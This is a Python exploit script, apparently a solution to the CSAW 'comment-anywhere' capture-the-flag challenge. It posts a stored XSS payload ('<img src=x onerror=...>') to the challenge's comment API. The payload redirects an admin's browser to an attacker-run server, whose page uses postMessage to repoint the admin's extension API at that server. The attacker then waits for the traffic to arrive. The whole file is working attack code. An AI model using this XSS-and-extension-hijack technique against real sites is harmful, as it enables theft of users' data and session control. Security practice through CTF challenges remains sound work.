import requests
import sys
import http.server
import socketserver
import threading

PUBLIC_IP = sys.argv[1]
PORT = 7777


class Handler(http.server.BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        if self.path == '/s':
            self._set_response()
            self.wfile.write(b"""
<html>
<body>
<script type="text/javascript">
window.onload = () => {
    window.postMessage({type: 'commentAnywhereSetCoords', coords: {type: 'setConfig', key: 'api', value: 'API_URL'}}, '*');
};
</script>
</body>
</html>
""".replace(b'API_URL', (f'http://{PUBLIC_IP}:{PORT}').encode('utf-8')))
            print(f"redirected admin extension to {PUBLIC_IP}, sit back and wait")
            return
        else:
            print(f"GET {self.path}")
            self._set_response()
            self.wfile.write(b"")


def srv():
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        httpd.serve_forever()


s = threading.Thread(target=srv)
s.start()

target_url = requests.get("http://comment-anywhere.chal.csaw.io:8000/comments", params={'url': 'http://.*(/?)?'}).json()[0]['url']
print(f'targeting {target_url}')

requests.post("http://comment-anywhere.chal.csaw.io:8000/comment", json={
    'url': target_url,
    'coords': {
        'x': 0,
        'y': 0,
    },
    'creator': 'default',
    'comment': f'<img src=x onerror="window.location.href=\'http://{PUBLIC_IP}:{PORT}/s\';" />',
})

print("xss comment placed")

s.join()
